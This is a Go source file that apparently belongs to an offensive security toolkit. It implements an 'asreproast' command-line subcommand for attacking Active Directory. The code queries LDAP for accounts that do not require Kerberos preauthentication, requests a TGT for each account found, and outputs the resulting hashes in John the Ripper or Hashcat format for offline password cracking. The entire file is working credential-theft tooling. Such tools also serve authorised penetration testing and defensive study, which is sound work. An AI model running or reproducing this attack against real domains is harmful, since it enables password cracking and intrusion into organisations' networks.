package kerberos

import (
	"fmt"
	"strings"

	"github.com/spf13/cobra"

	"github.com/vincd/savoir/modules/paquet/krb5"
	"github.com/vincd/savoir/modules/paquet/ldap"
)

func init() {
	var domain string
	var ldapUser string
	var ldapPassword string
	var username string
	var enctype string
	var dcIp string
	var format string
	var outputFile string

	var asRepRoastCmd = &cobra.Command{
		Use:   "asreproast",
		Short: "Perform AS-REP roasting against specified user(s)",
		Long:  `Perform AS-REP roasting against specified user(s)`,
		Args: func(cmd *cobra.Command, args []string) error {
			if format != "" && format != "john" && format != "hashcat" {
				return fmt.Errorf("Hash format should be john or hashcat")
			}

			if _, ok := encTypeMapping[strings.ToLower(enctype)]; !ok {
				return fmt.Errorf("enctype value is not valid.")
			}

			return nil
		},
		RunE: func(cmd *cobra.Command, args []string) error {
			if len(username) > 0 {
				tgt, err := krb5.AskTGT(domain, username, "", nil, paramStringToEType(strings.ToLower(enctype)), dcIp, true, false)
				if err != nil {
					return err
				}

				printTGT(tgt, format, outputFile, false)
			} else if len(ldapUser) > 0 && len(ldapPassword) > 0 {
				ldapClient, err := ldap.NewLDAPClient()
				if err != nil {
					return err
				}

				// TODO : support LDAPS
				if err := ldapClient.Connect(dcIp, 389); err != nil {
					return err
				}
				defer ldapClient.Close()

				if err := ldapClient.AuthenticateWithDomainAccount(domain, ldapUser, ldapPassword); err != nil {
					return err
				}

				query := "(&(UserAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"
				entries, err := ldapClient.Search(query, []string{"sAMAccountName"}, 1000)
				if err != nil {
					return err
				}

				for _, entry := range entries {
					currentUser := entry["sAMAccountName"]
					fmt.Printf("Found user: %s\n", currentUser)

					tgt, err := krb5.AskTGT(domain, currentUser, "", nil, paramStringToEType(strings.ToLower(enctype)), dcIp, true, false)
					if err != nil {
						fmt.Printf("Cannot ask a TGT for the user %s: %s\n", currentUser, err)
					}

					// Don't save the TGT to kirbi file when using LDAP
					printTGT(tgt, format, "", false)
				}
			} else {
				return fmt.Errorf("Please specify a target user or a valid LDAP creential.")
			}

			return nil
		},
	}

	asRepRoastCmd.Flags().StringVarP(&domain, "domain", "d", "", "Domain to target")
	asRepRoastCmd.Flags().StringVarP(&ldapUser, "ldap-user", "", "", "Username to connect to LDAP")
	asRepRoastCmd.Flags().StringVarP(&ldapPassword, "ldap-password", "", "", "Password to connect to LDAP")
	asRepRoastCmd.Flags().StringVarP(&username, "username", "u", "", "Username to roast")
	asRepRoastCmd.Flags().StringVarP(&enctype, "enctype", "e", "rc4", "Encryption type: rc4, aes128 or aes256")
	asRepRoastCmd.Flags().StringVarP(&dcIp, "dc-ip", "", "", "IP of the KDC (Domain controler)")
	asRepRoastCmd.Flags().StringVarP(&format, "format", "f", "", "Output hash as John the Ripper or Hashcat format (mode 18200)")
	asRepRoastCmd.Flags().StringVarP(&outputFile, "output", "o", "", "Output the TGT to a kirbi file")

	Command.AddCommand(asRepRoastCmd)
}
